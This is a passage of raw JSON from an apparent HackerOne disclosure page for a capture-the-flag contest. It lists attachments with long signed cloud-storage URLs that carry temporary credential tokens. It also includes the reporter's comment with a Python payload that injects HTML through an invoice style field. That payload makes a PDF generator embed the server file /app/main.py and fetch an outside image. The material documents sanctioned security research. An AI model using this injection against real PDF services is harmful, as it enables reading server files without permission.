v0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=30bd5fe509bee9afdd92f5050b1e39d1529b55d7273791290e2e70008f8512d6","file_size":4107,"type":"image/png"},{"id":451370,"file_name":"Thermostat_App_Infrastructure.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/370/ca50f43383d0085f335d8202f77d74e19a9825a4/Thermostat_App_Infrastructure.png?response-content-disposition=attachment%3B%20filename%3D%22Thermostat_App_Infrastructure.png%22%3B%20filename%2A%3DUTF-8%27%27Thermostat_App_Infrastructure.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=aa1eafd7c17e5fee332989b21f1d3155c4c182f5d27570af198c0dfe698779e4","file_size":413839,"type":"image/png"},{"id":451371,"file_name":"tweet.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/371/df1c6838667296680105c3cd835b1fae140b8e6c/tweet.PNG?response-content-disposition=attachment%3B%20filename%3D%22tweet.PNG%22%3B%20filename%2A%3DUTF-8%27%27tweet.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=d31bc76bcabd1febc4c2395c95e072bc1bce25aef969a31999d9838f1b2c283a","file_size":474989,"type":"image/png"},{"id":451372,"file_name":"Editor_6_.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/372/049570c5cdb612d0df42e9b3ca7941484012dad7/Editor_6_.mp4?response-content-disposition=attachment%3B%20filename%3D%22Editor_6_.mp4%22%3B%20filename%2A%3DUTF-8%27%27Editor_6_.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=bd4155a07bc1fd64e3f72c4b66a1a7fc2513ff03f4c03b9e72107be4b2bbe759","file_size":101016115,"type":"video/mp4"},{"id":451376,"file_name":"send_request_multi.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/376/8252def4c290fed687fcbc3778c243c3a3eefe3f/send_request_multi.py?response-content-disposition=attachment%3B%20filename%3D%22send_request_multi.py%22%3B%20filename%2A%3DUTF-8%27%27send_request_multi.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061333Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=52367d108df6c584190cc6783d3411775896a5267de59e467e05fe9fc1a28f00","file_size":3625,"type":"text/x-python"}],"allow_singular_disclosure_at":"2019-05-08T15:57:36.328Z","allow_singular_disclosure_after":-51891357.47791256,"singular_disclosure_allowed":true,"vote_count":141,"voters":["ikuamike","0x541","nytr0gen","checkm50","derision","sourc7","pprab","michiel","sigsegv_banana","kickino","and 131 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4398021,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Public version at: https://github.com/manoelt/50M_CTF_Writeup\n\nAlso a fix to my final payload. While I was writing the writeup I decided to remove an important part.\n\n```python\ninvoice = {\"companyName\":\"\", \"email\":\"\", \"invoiceNumber\":\"1\", \"date\":\"html\", \"\u003c\":\"\u003e\", \"items\":[[\"1\",\"manoelt\",\"manoelt\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"]],\"styles\":{\"body\":{\"}\u003c/style//\u003cimg src='http://mydomain.com.br'\u003e\u003clink rel='attachment' href='file:///app/main.py'\u003e\u003cstyle\u003e body: {  background-color\":\"white\"}}}\npayload = {\"d\" : json.dumps(invoice)}\npdfize(payload, \"style_invoice.pdf\")\n```","markdown_message":"\u003cp\u003ePublic version at: \u003ca title=\"https://github.com/manoelt/50M_CTF_Writeup\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmanoelt%2F50M_CTF_Writeup\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/manoelt/50M_CTF_Writeup\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAlso a fix to my final payload. While I was writing the writeup I decided to remove an important part.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;companyName\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;invoiceNumber\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;date\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;html\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026lt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;items\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;manoelt\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;styles\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;body\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;}\u0026lt;/style//\u0026lt;img src=\u0026#39;http://mydomain.com.br\u0026#39;\u0026gt;\u0026lt;link rel=\u0026#39;attachment\u0026#39; href=\u0026#39;file:///app/main.py\u0026#39;\u0026gt;\u0026lt;style\u0026gt; body: {  background-color\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;white\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}}}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einvoice\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\n\u003cspan class=\"n\"\u003epdfize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;style_invoice.pdf\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-03-26T23:49:07.945Z","updated_at":"2019-03-26T23:49:07.945Z","actor":{"username":"manoelt","cleared":true,"url":"/manoelt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/480/8ae9c94cfb10480af6e9c72f7989077b9c2d746a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4492836,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:31:24.440Z","updated_at":"2019-04-05T18:31:24.440Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"manoelt","url":"/manoelt"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509114,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:57:36.283Z","updated_at":"2019-04-08T15:57:36.283Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509115,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:57:42.853Z","updated_at":"2019-04-08T15:57:42.853Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}